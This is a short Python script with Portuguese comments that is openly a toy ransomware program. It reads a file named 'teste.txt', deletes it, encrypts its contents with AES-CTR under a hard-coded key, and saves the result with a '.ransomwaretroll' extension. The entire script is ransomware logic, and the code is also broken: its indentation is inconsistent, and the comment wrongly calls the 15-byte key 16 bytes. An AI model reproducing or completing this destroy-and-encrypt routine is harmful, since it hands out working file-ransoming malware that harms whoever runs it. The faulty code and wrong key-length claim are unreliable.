import os
import pyaes

file_name = "teste.txt"

try:
    # Abrir o arquivo de forma segura
    with open(file_name, "rb") as file:
        file_data = file.read()

     # Remover o arquivo original
        os.remove(file_name)

     # Definir a chave com 16 bytes
         key = b"testeransomware"  # 16 bytes
         aes = pyaes.AESModeOfOperationCTR(key)

     # Criptografar o arquivo
         crypto_data = aes.encrypt(file_data)

     # Salvar o arquivo criptografado
         encrypted_file_name = file_name + ".ransomwaretroll"
         with open(encrypted_file_name, 'wb') as new_file:
             new_file.write(crypto_data)

          print(f"Arquivo '{file_name}' criptografado com sucesso como '{encrypted_file_name}'.")
         except FileNotFoundError:
             print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
         except Exception as e:
             print(f"Erro inesperado: {e}")